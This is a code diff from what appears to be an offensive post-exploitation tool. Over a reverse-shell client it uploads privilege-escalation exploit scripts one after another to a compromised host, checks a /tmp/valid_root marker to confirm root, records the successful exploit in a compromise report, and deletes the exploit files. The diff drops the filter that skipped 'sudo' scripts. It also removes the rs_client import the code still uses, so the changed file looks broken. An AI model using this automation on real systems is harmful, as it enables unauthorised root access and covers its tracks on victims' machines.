@@ -1,6 +1,4 @@
 import os
-import sys
-import rs_client
 from time import sleep
 
 def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromission_recap_file_name: str) -> None:
@@ -12,7 +10,7 @@ def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromissi
     counter = 1
     for filename in os.listdir(directory):
         f = os.path.join(directory, filename)
-        if os.path.isfile(f) and 'sudo' not in f:
+        if os.path.isfile(f):
             print('[+] Uploading privesc script number {}'.format(counter))
             rsh = rs_client.RSH(sock)
             if '.sh' in f:
@@ -34,8 +32,8 @@ def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromissi
             if rsh.file_exists('/tmp/valid_root') == True:
                 print('[+] Privesc exploit worked !')
                 if compromission_recap_file_name:
-                    with open(compromission_recap_file_name, 'a') as c:
-                        c.write('Plugin used for priviledge escalation : {}'.format(f.split('/')[-1][:-3]))
+                    with open(compromission_recap_file_name, 'a') as report:
+                        report.write('## Vulnerability used for privilege escalation\n`{}`\n'.format(f.split('/')[-1][:-3]))
                 sleep(2)
                 sock.send('rm /tmp/valid_root\n')
                 sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
